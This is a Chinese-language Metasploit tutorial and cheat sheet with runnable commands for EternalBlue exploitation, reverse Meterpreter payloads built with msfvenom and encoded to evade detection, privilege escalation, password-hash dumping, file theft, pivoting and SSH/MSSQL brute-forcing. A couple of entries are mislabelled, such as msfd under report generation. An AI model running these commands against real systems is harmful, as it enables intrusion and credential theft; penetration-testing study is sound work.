---
order: 520
title: Metasploit 命令（渗透测试）
module: 'cybersecurity'
category: 云与基础设施
difficulty: beginner
description: Cybersecurity Metasploit 命令(渗透测试) 的完整教学讲解。
author: fanquanpp
updated: '2026-09-08'
related: []
prerequisites: []
---

## msfconsole 基础操作

**基本写法:启动 msfconsole**
`msfconsole`
```bash
# 启动 Metasploit 控制台
msfconsole -q
```

**基本写法:查看版本**
`version`
```bash
# 查看 Metasploit 版本
msfconsole -q -x "version"
```

**基本写法:查看模块统计**
`show <模块类型>`
```bash
# 查看各类型模块数量
show all
```

**基本写法:查看帮助**
`help <命令>`
```bash
# 查看指定命令帮助
help search
```

**基本写法:退出控制台**
`exit`
```bash
# 退出 msfconsole
exit
```

---

## 模块搜索与加载

**基本写法:搜索漏洞利用模块**
`search <关键字>`
```bash
# 搜索 SMB 相关利用模块
search name:smb type:exploit
```

**基本写法:按 CVE 搜索**
`search <CVE编号>`
```bash
# 按 CVE 编号搜索模块
search CVE-2021-44228
```

**基本写法:按平台搜索**
`search platform:<平台>`
```bash
# 搜索 Linux 平台模块
search platform:linux type:exploit
```

**基本写法:加载模块**
`use <模块路径>`
```bash
# 加载指定利用模块
use exploit/windows/smb/ms17_010_eternalblue
```

**基本写法:查看模块信息**
`info <模块路径>`
```bash
# 查看模块详细信息
info exploit/multi/handler
```

**基本写法:查看模块选项**
`show options`
```bash
# 查看当前模块的配置选项
show options
```

---

## 模块配置与执行

**基本写法:设置目标地址**
`set RHOSTS <目标IP>`
```bash
# 设置目标主机地址
set RHOSTS 192.168.1.10
```

**基本写法:设置本地监听地址**
`set LHOST <本机IP>`
```bash
# 设置反向连接监听地址
set LHOST 192.168.1.5
```

**基本写法:设置监听端口**
`set LPORT <端口>`
```bash
# 设置监听端口
set LPORT 4444
```

**基本写法:设置 Payload**
`set PAYLOAD <payload路径>`
```bash
# 设置反向 Meterpreter Payload
set PAYLOAD windows/meterpreter/reverse_tcp
```

**基本写法:执行模块**
`exploit`
```bash
# 执行当前加载的模块
exploit -j
```

**基本写法:设置目标编号**
`set TARGET <编号>`
```bash
# 设置目标系统类型编号
set TARGET 0
```

---

## Meterpreter 操作

**基本写法:查看系统信息**
`sysinfo`
```bash
# 查看目标系统信息
sysinfo
```

**基本写法:获取当前用户**
`getuid`
```bash
# 查看当前权限用户
getuid
```

**基本写法:提权**
`getsystem`
```bash
# 尝试提权到 SYSTEM
getsystem
```

**基本写法:执行系统命令**
`execute -f <命令> -i`
```bash
# 在目标执行命令
execute -f cmd.exe -i -H
```

**基本写法:下载文件**
`download <远程文件> <本地路径>`
```bash
# 从目标下载文件
download C:\\Users\\admin\\secret.txt /tmp/
```

**基本写法:上传文件**
`upload <本地文件> <远程路径>`
```bash
# 上传文件到目标
upload /tmp/payload.exe C:\\Users\\Public\\
```

**基本写法:截屏**
`screenshot`
```bash
# 截取目标屏幕
screenshot -p /tmp/screen.png
```

---

## 后渗透操作

**基本写法:获取密码哈希**
`hashdump`
```bash
# 导出系统密码哈希
hashdump
```

**基本写法:获取进程列表**
`ps`
```bash
# 列出目标进程
ps
```

**基本写法:迁移进程**
`migrate <PID>`
```bash
# 迁移到指定进程
migrate 1234
```

**基本写法:查看网络连接**
`netstat`
```bash
# 查看目标网络连接状态
netstat
```

**基本写法:路由添加**
`route add <子网> <掩码> <会话ID>`
```bash
# 通过 Meterpreter 会话添加路由
route add 192.168.2.0 255.255.255.0 1
```

**基本写法:建立 socks 代理**
`use auxiliary/server/socks4a`
```bash
# 加载 socks 代理模块用于内网穿透
use auxiliary/server/socks4a
set SRVHOST 127.0.0.1
set SRVPORT 1080
run -j
```

---

## 辅助模块使用

**基本写法:端口扫描**
`use auxiliary/scanner/portscan/tcp`
```bash
# 使用 TCP 端口扫描模块
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.10
set PORTS 1-1000
run
```

**基本写法:SMB 版本探测**
`use auxiliary/scanner/smb/smb_version`
```bash
# 探测 SMB 版本信息
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.10
run
```

**基本写法:SSH 登录爆破**
`use auxiliary/scanner/ssh/ssh_login`
```bash
# SSH 密码爆破模块
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.10
set USERNAME root
set PASS_FILE passwords.txt
run
```

**基本写法:HTTP 目录扫描**
`use auxiliary/scanner/http/dir_scanner`
```bash
# 扫描 Web 目录
use auxiliary/scanner/http/dir_scanner
set RHOSTS 192.168.1.10
set DICTIONARY /usr/share/wordlists/dirb/common.txt
run
```

**基本写法:数据库凭据收集**
`use auxiliary/scanner/mssql/mssql_login`
```bash
# MSSQL 登录测试模块
use auxiliary/scanner/mssql/mssql_login
set RHOSTS 192.168.1.10
set USERNAME sa
set PASSWORD admin123
run
```

---

## Payload 生成

**基本写法:生成反向 Payload**
`msfvenom -p <payload> LHOST=<IP> LPORT=<端口> -f <格式> -o <文件>`
```bash
# 生成 Windows 反向 Meterpreter Payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe -o payload.exe
```

**基本写法:生成 Linux Payload**
`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<端口> -f elf -o <文件>`
```bash
# 生成 Linux ELF 格式 Payload
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f elf -o payload.elf
```

**基本写法:生成 Python Payload**
`msfvenom -p python/meterpreter/reverse_tcp LHOST=<IP> LPORT=<端口> -f raw -o <文件>`
```bash
# 生成 Python 格式 Payload
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f raw -o payload.py
```

**基本写法:生成 Payload 时编码**
`msfvenom -p <payload> -e <编码器> -i <次数> LHOST=<IP> LPORT=<端口> -f <格式> -o <文件>`
```bash
# 使用 shikata_ga_nai 编码 5 次
msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 LHOST=192.168.1.5 LPORT=4444 -f exe -o payload.exe
```

**基本写法:生成 PHP Payload**
`msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP> LPORT=<端口> -f php -o <文件>`
```bash
# 生成 PHP 格式 Payload
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f php -o payload.php
```

---

## 数据库操作

**基本写法:连接 PostgreSQL**
`db_connect <用户>:<密码>@<主机>/<数据库>`
```bash
# 连接 Metasploit 数据库
db_connect msf:msf@127.0.0.1/msf
```

**基本写法:查看数据库状态**
`db_status`
```bash
# 查看数据库连接状态
db_status
```

**基本写法:导入 nmap 扫描结果**
`db_import <XML文件>`
```bash
# 导入 nmap XML 扫描结果
db_import nmap_scan.xml
```

**基本写法:查看主机列表**
`hosts`
```bash
# 查看数据库中保存的主机
hosts
```

**基本写法:查看服务列表**
`services`
```bash
# 查看发现的服务
services
```

**基本写法:查看凭据**
`creds`
```bash
# 查看收集到的凭据
creds
```

---

## 资源脚本与自动化

**基本写法:执行资源脚本**
`resource <脚本文件>`
```bash
# 批量执行命令脚本
resource /tmp/commands.rc
```

**基本写法:创建资源脚本**
`echo "use auxiliary/scanner/portscan/tcp" > <脚本>`
```bash
# 创建自动化扫描脚本
cat > /tmp/scan.rc << 'EOF'
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set PORTS 22,80,443
run
EOF
```

**基本写法:启动时执行脚本**
`msfconsole -r <脚本文件>`
```bash
# 启动时执行指定脚本
msfconsole -r /tmp/scan.rc
```

**基本写法:执行单条命令**
`msfconsole -x "<命令>"`
```bash
# 启动后执行单条命令
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.5; set LPORT 4444; run"
```

---

## 报告与会话管理

**基本写法:查看活跃会话**
`sessions -l`
```bash
# 列出所有 Meterpreter 会话
sessions -l
```

**基本写法:进入指定会话**
`sessions -i <ID>`
```bash
# 进入指定 ID 的会话
sessions -i 1
```

**基本写法:后台当前会话**
`background`
```bash
# 将当前会话转入后台
background
```

**基本写法:杀死会话**
`sessions -k <ID>`
```bash
# 终止指定会话
sessions -k 1
```

**基本写法:生成报告**
`msfd`
```bash
# 启动 Metasploit 守护进程服务
msfd -a 127.0.0.1 -p 7337
```

---

## Metasploit 模块更新

**基本写法:更新 Metasploit**
`msfupdate`
```bash
# 更新 Metasploit 框架
msfupdate
```

**基本写法:查看已加载插件**
`show plugins`
```bash
# 查看可用插件列表
load wiki
```

**基本写法:加载插件**
`load <插件名>`
```bash
# 加载 nessus 插件
load nessus
```

**基本写法:查看数据库工作空间**
`workspace`
```bash
# 查看与切换工作空间
workspace
workspace -a pentest
```

**基本写法:查看模块缓存**
`show module_paths`
```bash
# 查看模块加载路径
show module_paths
```
